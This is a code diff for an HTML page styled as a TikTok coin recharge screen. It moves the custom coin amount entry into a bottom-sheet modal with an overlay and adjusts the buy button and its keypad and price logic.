@@ -91,6 +91,15 @@
     main.with-bottom-bar {
         margin-bottom: 120px; /* leave enough space */
     }
+
+    /* Styles for the new bottom sheet modal */
+    body.modal-open #custom-coin-overlay {
+        opacity: 1;
+        pointer-events: auto;
+    }
+    body.modal-open #custom-coin-modal {
+        transform: translateY(0);
+    }
   </style>
 </head>
 
@@ -109,7 +118,7 @@
   <header id="popup-header" class="fixed top-10 left-0 right-0 z-40 bg-white border-b border-gray-200 shadow-sm transition-transform duration-300 ease-out -translate-y-full">
     <div class="container mx-auto px-4 h-16 flex items-center justify-between gap-2 sm:gap-4">
       <div class="flex items-center flex-shrink-0">
-         <svg class="w-auto h-8" viewBox="0 0 118 42" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path><path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path><path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path><path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path><path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path><path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path><path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path></svg>
+        <svg class="w-auto h-8" viewBox="0 0 118 42" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path fill="#25F4EE" d="M9.875 16.842v-1.119A8.836 8.836 0 008.7 15.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 25.55c0-4.737 3.794-8.598 8.495-8.707z"></path><path fill="#25F4EE" d="M10.086 29.526c2.14 0 3.89-1.707 3.967-3.83l.006-18.968h3.463a6.78 6.78 0 01-.11-1.202h-4.726l-.006 18.969a3.978 3.978 0 01-3.967 3.829 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 13.166v-1.055a6.506 6.506 0 01-3.583-1.068 6.571 6.571 0 003.583 2.123z"></path><path fill="#FE2C55" d="M20.409 11.043a6.54 6.54 0 01-1.616-4.315h-1.265a6.557 6.557 0 002.88 4.316zM8.706 20.365a3.98 3.98 0 00-3.973 3.976c0 1.528.869 2.858 2.134 3.523a3.936 3.936 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.409 0 .805.07 1.175.185v-4.833a8.837 8.837 0 00-1.175-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.176-.185z"></path><path fill="#FE2C55" d="M23.992 13.166v3.676c-2.453 0-4.727-.786-6.58-2.116v9.621c0 4.802-3.902 8.714-8.706 8.714a8.669 8.669 0 01-4.988-1.579 8.69 8.69 0 006.368 2.781c4.797 0 8.707-3.906 8.707-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.48 0-.94-.052-1.38-.148z"></path><path fill="black" d="M17.413 24.348v-9.622a11.251 11.251 0 006.58 2.116v-3.676a6.571 6.571 0 01-3.584-2.123 6.61 6.61 0 01-2.888-4.315H14.06l-.006 18.968a3.978 3.978 0 01-3.967 3.83A3.99 3.99 0 016.86 27.87a3.991 3.991 0 01-2.133-3.523A3.98 3.98 0 018.7 20.372c.409 0 .805.07 1.175.185v-3.708c-4.701.103-8.495 3.964-8.495 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.988 1.58c4.798 0 8.707-3.913 8.707-8.714zM30.048 13.179h14.774l-1.354 4.232h-3.832v15.644h-4.778V17.41l-4.804.006-.006-4.238zM69.032 13.179h15.12l-1.355 4.232h-4.17v15.644h-4.785V17.41l-4.804.006-.006-4.238zM45.73 19.502h4.733v13.553h-4.708l-.026-13.553zM52.347 13.128h4.733v9.257l4.689-4.61h5.646l-5.934 5.76 6.644 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236H52.34V13.128h.006zM102.49 13.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V13.128zM48.093 17.954a2.384 2.384 0 002.382-2.384 2.384 2.384 0 10-2.382 2.384z"></path><path fill="#25F4EE" d="M83.544 24.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path><path fill="#FE2C55" d="M92.858 16.83c-.217 0-.505.012-.716.025a8.111 8.111 0 017.468 8.087 8.112 8.112 0 01-7.468 8.087c.211.02.499.026.716.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path><path fill="black" d="M91.58 28.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.942 3.945zm0-12.058c-4.477 0-8.106 3.631-8.106 8.113 0 4.482 3.629 8.113 8.106 8.113 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path></svg>
       </div>
       
       <div class="flex-1 min-w-0 mx-2">
@@ -193,7 +202,7 @@
                 </div>
                 <p class="text-center text-sm font-medium">£164.55</p>
               </div>
-              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover" data-price="0" data-coins="Custom">
+              <div class="coin-option bg-white border border-tiktok-gray rounded-lg p-4 cursor-pointer hover:border-tiktok-accent hover:shadow-tiktok-hover" data-coins="Custom">
                 <div class="flex flex-col items-center justify-center h-full">
                   <span class="font-bold text-base">Custom</span>
                 </div>
@@ -222,8 +231,29 @@
             </div>
         </div>
       </div>
-      
-      <div id="custom-recharge-view" class="hidden">
+    </div>
+  </main>
+
+  <div class="fixed-bottom-btn">
+    <div class="container mx-auto px-4 max-w-md">
+      <div class="flex items-center justify-center gap-4 mb-4">
+          <i class="fab fa-cc-visa text-2xl text-blue-800"></i>
+          <i class="fab fa-cc-mastercard text-2xl text-red-600"></i>
+          <i class="fab fa-cc-amex text-2xl text-blue-600"></i>
+          <i class="fab fa-paypal text-2xl text-blue-700"></i>
+          <i class="fab fa-apple-pay text-2xl"></i>
+      </div>
+      <button id="buy-button" class="w-full bg-tiktok-accent text-white font-bold text-lg py-3 rounded-full shadow-md hover:bg-red-600 transition flex items-center justify-center disabled:bg-tiktok-accent/40 disabled:cursor-not-allowed">
+        <svg fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" class="mr-2"><path d="M28.22 13.7a4.83 4.83 0 0 0 4.86 4.8l-.04 3.45c-1.77 0-3.4-.53-4.75-1.43l-.09 6.99a6.64 6.64 0 0 1-6.69 6.3 6.44 6.44 0 0 1-6.53-6.45 6.63 6.63 0 0 1 7.61-6.4l-.04 3.7a2.97 2.97 0 0 0-3.88 2.7 2.85 2.85 0 0 0 2.89 2.85 2.93 2.93 0 0 0 2.96-2.85l.16-13.66h3.54Z"></path><path d="M5 23.15V10.5c0-1.2 1.06-2.17 2.26-2.28 3.05-.25 8.87-1.52 15.34-6.99.8-.67 2-.67 2.8 0 6.46 5.46 12.28 6.74 15.34 7 1.2.1 2.26 1.07 2.26 2.27v12.65c0 14.13-14.77 21.8-18.27 23.43-.47.22-1 .22-1.47 0C19.76 44.96 5 37.28 5 23.15Zm4-11.1v11.1c0 5.57 2.88 10.04 6.56 13.5 3.1 2.91 6.5 4.86 8.44 5.85a37.07 37.07 0 0 0 8.43-5.85C36.11 33.2 39 28.72 39 23.15V12.04c-3.65-.53-9.1-2.16-15-6.8-5.91 4.64-11.35 6.27-15 6.8Z"></path></svg>
+        <span id="buy-button-span">Buy for £0.29</span>
+      </button>
+    </div>
+  </div>
+  
+  <div id="custom-coin-overlay" class="fixed inset-0 bg-black bg-opacity-50 z-50 opacity-0 pointer-events-none transition-opacity duration-300"></div>
+  <div id="custom-coin-modal" class="fixed bottom-0 left-0 right-0 bg-white rounded-t-2xl shadow-lg z-50 p-4 transition-transform duration-300 ease-out transform translate-y-full max-w-md mx-auto">
+    <div class="mx-auto w-12 h-1.5 bg-gray-300 rounded-full mb-4"></div>
+    <div id="custom-recharge-view">
         <div class="flex items-center justify-between mb-6">
             <button id="back-to-main-view-btn" class="text-gray-600 hover:text-black p-2 -ml-2">
                 <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
@@ -290,24 +320,6 @@
               <span id="custom-total-price" class="text-lg font-bold">£0.00</span>
           </div>
         </div>
-      </div>
-
-    </div>
-  </main>
-
-  <div class="fixed-bottom-btn">
-    <div class="container mx-auto px-4 max-w-md">
-      <div class="flex items-center justify-center gap-4 mb-4">
-            <i class="fab fa-cc-visa text-2xl text-blue-800"></i>
-            <i class="fab fa-cc-mastercard text-2xl text-red-600"></i>
-            <i class="fab fa-cc-amex text-2xl text-blue-600"></i>
-            <i class="fab fa-paypal text-2xl text-blue-700"></i>
-            <i class="fab fa-apple-pay text-2xl"></i>
-      </div>
-      <button id="buy-button" class="w-full bg-tiktok-accent text-white font-bold text-lg py-3 rounded-full shadow-md hover:bg-red-600 transition flex items-center justify-center disabled:bg-gray-300 disabled:cursor-not-allowed">
-        <svg fill="currentColor" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" class="mr-2"><path d="M28.22 13.7a4.83 4.83 0 0 0 4.86 4.8l-.04 3.45c-1.77 0-3.4-.53-4.75-1.43l-.09 6.99a6.64 6.64 0 0 1-6.69 6.3 6.44 6.44 0 0 1-6.53-6.45 6.63 6.63 0 0 1 7.61-6.4l-.04 3.7a2.97 2.97 0 0 0-3.88 2.7 2.85 2.85 0 0 0 2.89 2.85 2.93 2.93 0 0 0 2.96-2.85l.16-13.66h3.54Z"></path><path d="M5 23.15V10.5c0-1.2 1.06-2.17 2.26-2.28 3.05-.25 8.87-1.52 15.34-6.99.8-.67 2-.67 2.8 0 6.46 5.46 12.28 6.74 15.34 7 1.2.1 2.26 1.07 2.26 2.27v12.65c0 14.13-14.77 21.8-18.27 23.43-.47.22-1 .22-1.47 0C19.76 44.96 5 37.28 5 23.15Zm4-11.1v11.1c0 5.57 2.88 10.04 6.56 13.5 3.1 2.91 6.5 4.86 8.44 5.85a37.07 37.07 0 0 0 8.43-5.85C36.11 33.2 39 28.72 39 23.15V12.04c-3.65-.53-9.1-2.16-15-6.8-5.91 4.64-11.35 6.27-15 6.8Z"></path></svg>
-        <span>Buy for £0.29</span>
-      </button>
     </div>
   </div>
   
@@ -320,10 +332,10 @@
       const bodyEl = document.body;
       const coinOptions = document.querySelectorAll('.coin-option');
       const buyButton = document.getElementById('buy-button');
-      const buyButtonSpan = buyButton.querySelector('span');
+      const buyButtonSpan = document.getElementById('buy-button-span');
       
-      const mainRechargeView = document.getElementById('main-recharge-view');
-      const customRechargeView = document.getElementById('custom-recharge-view');
+      const customCoinModal = document.getElementById('custom-coin-modal');
+      const customCoinOverlay = document.getElementById('custom-coin-overlay');
       const backToMainViewBtn = document.getElementById('back-to-main-view-btn');
 
       // Custom view elements
@@ -359,13 +371,9 @@
           const coins = option.dataset.coins;
 
           if (coins === 'Custom') {
-            // Switch to custom view
-            mainRechargeView.classList.add('hidden');
-            customRechargeView.classList.remove('hidden');
-            buyButtonSpan.textContent = `Recharge`;
-            updateCustomView(); // Reset and disable button
+            openCustomModal();
           } else {
-             // Handle regular selection
+            // Handle regular selection
             coinOptions.forEach(opt => {
               opt.classList.remove('bg-tiktok-accent/10', 'border-2', 'border-tiktok-accent', 'shadow-tiktok-hover');
               opt.classList.add('bg-white', 'border-tiktok-gray');
@@ -381,15 +389,25 @@
         });
       });
 
-      // Back button from custom view
-      backToMainViewBtn.addEventListener('click', () => {
-          mainRechargeView.classList.remove('hidden');
-          customRechargeView.classList.add('hidden');
-          customCoinAmount = ''; // reset custom amount
-          if (coinOptions.length > 0) {
-              coinOptions[0].click(); // Go back to default selection
-          }
-      });
+      function openCustomModal() {
+        bodyEl.classList.add('modal-open');
+        buyButtonSpan.textContent = `Recharge`;
+        updateCustomView(); // Reset and disable button
+      }
+
+      function closeCustomModal() {
+        bodyEl.classList.remove('modal-open');
+        customCoinAmount = ''; // reset custom amount
+        // Go back to default selection visual state
+        if (coinOptions.length > 0) {
+            coinOptions[0].click(); 
+        }
+      }
+
+      // Back button from custom view & overlay click
+      backToMainViewBtn.addEventListener('click', closeCustomModal);
+      customCoinOverlay.addEventListener('click', closeCustomModal);
+
 
       // Keypad logic
       keypadKeys.forEach(key => {
@@ -398,10 +416,10 @@
           if (keyValue === 'backspace') {
             customCoinAmount = customCoinAmount.slice(0, -1);
           } else {
-             const potentialAmount = parseInt(customCoinAmount + keyValue, 10);
-             if (potentialAmount <= MAX_COINS) {
-                customCoinAmount += keyValue;
-             }
+              const potentialAmount = parseInt(customCoinAmount + keyValue, 10);
+              if (potentialAmount <= MAX_COINS) {
+                  customCoinAmount += keyValue;
+              }
           }
           updateCustomView();
         });
@@ -423,11 +441,9 @@
               const price = Math.ceil(amount * COIN_RATE * 100) / 100;
               const formattedPrice = `£${price.toFixed(2)}`;
               customTotalPrice.textContent = formattedPrice;
-              buyButtonSpan.textContent = `Recharge for ${formattedPrice}`;
               buyButton.disabled = false;
           } else {
               customTotalPrice.textContent = '£0.00';
-              buyButtonSpan.textContent = 'Recharge';
               buyButton.disabled = true;
           }
       }
